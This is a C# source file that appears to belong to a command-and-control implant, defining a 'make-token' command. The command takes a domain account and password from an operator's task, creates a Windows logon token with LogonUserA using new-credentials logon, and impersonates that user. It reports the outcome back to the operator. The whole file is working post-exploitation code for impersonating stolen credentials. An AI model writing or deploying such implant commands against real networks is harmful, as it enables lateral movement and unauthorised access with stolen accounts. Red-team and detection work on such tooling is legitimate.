using Agent.Commands;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Commands
{
    public class MakeTokenCommand : AgentCommand
    {
        public override string Name => "make-token";
        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, MessageManager commm)
        {
            // make-token DOMAIN\Username Password
            var userDomain = task.SplittedArgs[0];
            var password = task.SplittedArgs[1];

            var split = userDomain.Split('\\');
            var domain = split[0];
            var username = split[1];

            IntPtr hToken = IntPtr.Zero;
            if (Agent.Native.Advapi.LogonUserA(username, domain, password, Agent.Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS, Agent.Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
            {
                if (Agent.Native.Advapi.ImpersonateLoggedOnUser(hToken))
                   {
                    var identity = new WindowsIdentity(hToken);
                    result.Result += $"Successfully impersonated {identity.Name}";
                    return;
                }

                result.Result += $"Successfully made token but failed to impersonate";
                return;
            }

            result.Result += $"Failed to make token";
            return;
        }
    }
}
